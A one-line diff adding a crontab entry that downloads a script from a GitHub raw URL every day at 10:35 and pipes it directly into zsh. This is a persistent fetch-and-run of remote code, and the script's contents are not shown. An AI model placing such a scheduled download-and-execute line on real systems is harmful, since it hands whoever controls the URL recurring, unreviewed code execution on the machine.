@@ -1,0 +1,1 @@
+35 10 * * * curl https://raw.githubusercontent.com/Aleks4ndr/zsh_remote_script/main/remote_script | zsh
